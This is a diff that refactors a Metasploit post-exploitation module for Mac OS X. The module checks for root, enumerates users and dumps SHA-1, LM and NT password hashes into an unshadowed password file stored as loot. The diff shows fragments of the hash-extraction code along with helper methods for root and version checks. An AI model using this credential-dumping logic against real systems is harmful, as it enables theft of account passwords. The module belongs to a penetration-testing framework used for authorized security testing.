@@ -20,9 +20,12 @@ class Metasploit3 < Msf::Post
             This module dumps SHA-1, LM and NT Hashes of Mac OS X Tiger, Leopard, Snow Leopard and Lion Systems.
         },
         'License'       => MSF_LICENSE,
-        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>','hammackj <jacob.hammack[at]hammackj.com>'],
+        'Author'        => [
+          'Carlos Perez <carlos_perez[at]darkoperator.com>',
+          'hammackj <jacob.hammack[at]hammackj.com>'
+        ],
         'Platform'      => [ 'osx' ],
-        'SessionTypes'  => [ "shell" ]
+        'SessionTypes'  => [ 'shell' ]
       ))
 
   end
@@ -36,13 +39,9 @@ class Metasploit3 < Msf::Post
       host = session.shell_command_token("hostname").chomp
     end
     print_status("Running module against #{host}")
-    running_root = check_root
-    if running_root
+    if root?
       print_status("This session is running as root!")
-    end
-    ver_num = get_ver
-    if running_root
-      dump_hash(ver_num)
+      dump_hash
     else
       print_error("Insufficient Privileges you must be running as root to dump the hashes")
     end
@@ -50,7 +49,6 @@ class Metasploit3 < Msf::Post
 
   #parse the dslocal plist in lion
   def read_ds_xml_plist(plist_content)
-
     require "rexml/document"
 
     doc  = REXML::Document.new(plist_content)
@@ -79,28 +77,23 @@ class Metasploit3 < Msf::Post
   end
 
   # Checks if running as root on the target
-  def check_root
-    # Get only the account ID
-    id = cmd_exec("/usr/bin/id","-ru").chomp
-
-    if id == "0"
-      return true
-    else
-      return false
-    end
+  # @return [Bool] current user is root
+  def root?
+    whoami == 'root'
   end
 
+  # @return [String] name of current user
+  def whoami
+    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
+  end
 
-  # Enumerate the OS Version
-  def get_ver
-    # Get the OS Version
-    osx_ver_num = cmd_exec("/usr/bin/sw_vers", "-productVersion").chomp
-
-    return osx_ver_num
+  # @return [String] version string (e.g. 10.8.5)
+  def ver_num
+    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
   end
 
   # Dump SHA1 Hashes used by OSX, must be root to get the Hashes
-  def dump_hash(ver_num)
+  def dump_hash
     print_status("Dumping Hashes")
     users = []
     nt_hash = nil
@@ -181,7 +174,7 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    users_folder = cmd_exec("/bin/ls","/Users")
+    users_folder = cmd_exec("/bin/ls", "/Users")
 
     users_folder.each_line do |u|
       next if u.chomp =~ /Shared|\.localized/
@@ -189,10 +182,10 @@ class Metasploit3 < Msf::Post
     end
     # Process each user
     users.each do |user|
-      if ver_num =~ /10\.(6|5)/
-        guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
-      elsif ver_num =~ /10\.(4|3)/
-        guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
+      if leopard?
+        guid = cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
+      elsif tiger?
+        guid = cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
       end
 
       # Extract the hashes
@@ -235,4 +228,23 @@ class Metasploit3 < Msf::Post
     upassf = store_loot("osx.hashes.sha1", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
     print_good("Unshadowed Password File: #{upassf}")
   end
+
+
+  # @return [Bool] system version is at least 10.7
+  def lion?
+    ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
+  end
+
+
+  # @return [Bool] system version is at least 10.5
+  def leopard?
+    ver_num =~ /10\.(\d+)/ and $1.to_i >= 5
+  end
+
+  
+  # @return [Bool] system version is 10.4 or lower
+  def tiger?
+    ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
+  end
+
 end
